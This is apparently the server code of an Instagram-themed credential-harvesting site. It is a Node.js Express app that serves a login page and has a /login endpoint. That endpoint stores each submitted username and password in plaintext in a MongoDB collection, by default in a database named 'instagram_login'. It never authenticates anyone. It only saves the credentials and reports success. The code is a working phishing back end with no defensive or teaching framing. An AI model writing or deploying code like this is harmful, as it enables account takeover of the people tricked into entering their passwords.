const express = require('express');
const path = require('path');
const { MongoClient } = require('mongodb');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const mongoUri = process.env.MONGODB_URI;
const dbName = process.env.DB_NAME || 'instagram_login';
const collectionName = process.env.COLLECTION_NAME || 'logins';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

let mongoClient = null;
let db = null;
let connectionErrorMessage = null;

async function connectToMongo() {
  if (!mongoUri) {
    connectionErrorMessage = 'MONGODB_URI is not set. Login submissions will not be saved until it is configured.';
    console.log(connectionErrorMessage);
    return;
  }

  try {
    mongoClient = new MongoClient(mongoUri);
    await mongoClient.connect();
    db = mongoClient.db(dbName);
    connectionErrorMessage = null;
    console.log(`Connected to MongoDB Atlas database: ${dbName}`);
  } catch (error) {
    connectionErrorMessage = error.message;
    console.error('MongoDB connection failed:', error.message);
  }
}

connectToMongo();

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', async (req, res) => {
  const username = (req.body.username || '').trim();
  const password = (req.body.password || '').trim();

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }

  if (!db) {
    return res.status(500).json({
      success: false,
      message: connectionErrorMessage || 'MongoDB Atlas is not configured. Set MONGODB_URI in your environment before trying again.'
    });
  }

  try {
    const result = await db.collection(collectionName).insertOne({
      username,
      password,
      createdAt: new Date()
    });

    return res.json({
      success: true,
      message: 'Login data saved successfully.',
      insertedId: result.insertedId
    });
  } catch (error) {
    console.error('Failed to save login data:', error);
    return res.status(500).json({ success: false, message: error.message || 'Failed to save login data.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
